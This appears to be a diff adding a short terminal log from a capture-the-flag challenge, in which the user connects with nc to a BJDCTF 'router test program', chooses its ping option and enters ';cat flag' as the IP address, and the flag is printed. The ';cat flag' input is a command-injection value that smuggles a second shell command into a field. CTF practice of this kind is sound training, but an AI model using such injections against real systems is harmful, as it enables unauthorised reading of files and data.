@@ -1,0 +1,15 @@
+nop@nop-pwn:~/Desktop$ nc node3.buuoj.cn 25896
+Welcome to BJDCTF router test program! 
+1.ping
+2.test
+3.leave comments
+4.root
+5.exit
+Please input u choose:
+1
+Please input the ip address:
+;cat flag
+sh: 1: ping: not found
+flag{b2c49e67-b899-42d2-9e9c-8c5ac24c03d6}
+sh: 2: llocatping: not found
+done!
